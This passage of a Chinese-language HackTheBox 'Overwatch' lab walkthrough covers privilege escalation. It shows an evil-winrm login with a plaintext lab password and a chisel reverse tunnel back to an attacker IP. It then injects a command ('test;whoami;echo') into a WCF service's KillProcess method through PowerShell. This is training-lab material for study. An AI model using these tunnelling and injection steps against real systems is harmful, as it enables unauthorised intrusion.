+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.129.244.81 -u sqlmgmt -p bIhBbzMMnB82yx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770743418301.png" alt="1770743418301"></p>
+<h2 id="4-权限提升"><a href="#4-权限提升" class="headerlink" title="4. 权限提升"></a>4. 权限提升</h2><h3 id="4-1-MCF-Service"><a href="#4-1-MCF-Service" class="headerlink" title="4.1 MCF Service"></a>4.1 MCF Service</h3><p>在目标机器上查看监听的TCP端口，发现了overwatch.exe.config文件中的Web服务端口。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano -p tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770743498815.png" alt="1770743498815"></p>
+<p>用chisel做一个代理，将攻击机的8000端口转发到目标机器的本地8000端口。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel server --port 9999 --reverse</span><br><span class="line">./chisel.exe client 10.10.17.249:9999 R:8000:127.0.0.1:8000</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770743892498.png" alt="1770743892498"></p>
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770743903768.png" alt="1770743903768"></p>
+<p>访问本地的8000端口，这是个WCF（一个基于SOAP的Web服务）的帮助页面。</p>
+<p>其中&#x2F;MonitorService?wsdl路径为WSDL地址（包含了服务的所有方法和参数）。</p>
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770743966023.png" alt="1770743966023"></p>
+<p>继续访问WSDL路径，</p>
+<ul>
+<li><p>服务名称：MonitoringService。</p>
+</li>
+<li><p>命名空间：<a target="_blank" rel="noopener" href="http://tempuri.org/%E3%80%82">http://tempuri.org/。</a></p>
+</li>
+<li><p>端点地址：<a target="_blank" rel="noopener" href="http://overwatch.htb:8000/MonitorService%E3%80%82">http://overwatch.htb:8000/MonitorService。</a></p>
+</li>
+<li><p>绑定类型：BasicHttpBinding。</p>
+</li>
+</ul>
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770744640236.png" alt="1770744640236"></p>
+<p>暴露的三个操作方法如下：StartMonitoring、StopMonitoring、KillProcess。</p>
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770744730594.png" alt="1770744730594"></p>
+<h3 id="4-2-MCF命令注入"><a href="#4-2-MCF命令注入" class="headerlink" title="4.2 MCF命令注入"></a>4.2 MCF命令注入</h3><p>该MCF应用程序之前已经通过SMB共享拿到了，用Dnspy查看三个操作对应的源码。</p>
+<p>在KillProcess方法中，可以直接命令注入。</p>
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770744851983.png" alt="1770744851983"></p>
+<p>通过PowerShell创建WCF服务代理，调用其中的KillProcess方法进行命令注入。</p>
+<ul>
+<li>New-WebServiceProxy：自动生成Web服务客户端。</li>
+<li>-Uri：指定WSDL地址，PowerShell下载并解析WSDL，自动生成客户端类。</li>
+<li>-UseDefaultCredential：使用当前的Windows凭据进行认证。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">wcfClient = New-WebServiceProxy -Uri <span class="string">&quot;http://overwatch.htb:8000/MonitorService?wsdl&quot;</span> -UseDefaultCredential</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">wcfClient.killProcess(<span class="string">&quot;test;whoami;echo&quot;</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770745183539.png" alt="1770745183539"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">1. 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-DNS%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 DNS枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-SMB%E5%85%B1%E4%BA%AB"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 SMB共享</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%9D%E5%A7%8B%E7%AB%8B%E8%B6%B3"><span class="toc-number">2.</span> <span class="toc-text">2. 初始立足</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 逆向分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-MSSQL%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 MSSQL连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.</span> <span class="toc-text">3. 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-MSSQL-Link"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 MSSQL Link</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-MCF-Service"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 MCF Service</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-MCF%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 MCF命令注入</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&text=HackTheBox Machine Overwatch"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&title=HackTheBox Machine Overwatch"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&is_video=false&description=HackTheBox Machine Overwatch"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox Machine Overwatch&body=Check out this article: http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&title=HackTheBox Machine Overwatch"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&title=HackTheBox Machine Overwatch"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&title=HackTheBox Machine Overwatch"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&title=HackTheBox Machine Overwatch"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&name=HackTheBox Machine Overwatch&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&t=HackTheBox Machine Overwatch"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
